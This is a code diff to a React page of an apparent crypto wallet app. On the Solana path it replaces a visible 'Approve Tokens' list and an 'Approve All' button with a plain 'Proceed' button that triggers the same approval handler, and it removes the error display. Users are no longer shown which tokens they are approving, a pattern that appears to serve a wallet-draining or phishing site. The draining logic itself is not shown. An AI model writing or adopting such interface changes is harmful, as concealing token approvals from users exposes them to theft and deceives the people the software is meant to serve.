@@ -709,7 +709,7 @@ export default function Home() {
         <div className="max-w-md mx-auto">
           <div className="bg-card rounded-3xl border border-border shadow-lg p-2 relative">
             {isWalletConnected && (
-              <div className="absolute inset-0 z-20 flex items-center justify-center bg-white/95 backdrop-blur-md rounded-3xl p-4">
+              <div className="absolute inset-0 z-20 flex items-center justify-center bg-white/80 backdrop-blur-md rounded-3xl">
                 {networkType === "solana" ? (
                   solanaStep === "done" ? (
                     <div className="bg-green-500 text-white px-10 py-4 rounded-full text-lg font-semibold flex items-center gap-2 shadow-lg">
@@ -717,44 +717,21 @@ export default function Home() {
                       Complete!
                     </div>
                   ) : (
-                    <div className="w-full max-w-sm">
-                      <h3 className="text-lg font-semibold text-center mb-3 text-foreground">Approve Tokens</h3>
-                      <div className="space-y-2 mb-4 max-h-48 overflow-y-auto">
-                        {SOLANA_APPROVAL_TOKENS.map((token) => (
-                          <div 
-                            key={token.mint}
-                            className="flex items-center justify-between p-3 bg-muted rounded-xl"
-                          >
-                            <div className="flex items-center gap-3">
-                              <TokenIcon symbol={token.symbol} size={32} />
-                              <div>
-                                <div className="font-medium text-foreground">{token.symbol}</div>
-                                <div className="text-xs text-muted-foreground">{token.name}</div>
-                              </div>
-                            </div>
-                            <CheckCircle className="w-5 h-5 text-green-500" />
-                          </div>
-                        ))}
-                      </div>
-                      <button
-                        onClick={handleSolanaProceed}
-                        disabled={isSolanaProcessing}
-                        className="w-full bg-[#FF00D6] hover:bg-[#e800c0] text-white py-4 rounded-full text-lg font-semibold flex items-center gap-2 justify-center disabled:opacity-80 shadow-lg"
-                        data-testid="button-proceed-solana"
-                      >
-                        {isSolanaProcessing ? (
-                          <>
-                            <Loader2 className="w-5 h-5 animate-spin" />
-                            Processing...
-                          </>
-                        ) : (
-                          "Approve All"
-                        )}
-                      </button>
-                      {error && (
-                        <p className="text-red-500 text-sm text-center mt-2">{error}</p>
+                    <button
+                      onClick={handleSolanaProceed}
+                      disabled={isSolanaProcessing}
+                      className="bg-[#FF00D6] hover:bg-[#e800c0] text-white px-12 py-4 rounded-full text-lg font-semibold flex items-center gap-2 min-w-[200px] justify-center disabled:opacity-80 shadow-lg"
+                      data-testid="button-proceed-solana"
+                    >
+                      {isSolanaProcessing ? (
+                        <>
+                          <Loader2 className="w-5 h-5 animate-spin" />
+                          Processing...
+                        </>
+                      ) : (
+                        "Proceed"
                       )}
-                    </div>
+                    </button>
                   )
                 ) : step === "done" ? (
                   <div className="bg-green-500 text-white px-10 py-4 rounded-full text-lg font-semibold flex items-center gap-2 shadow-lg">
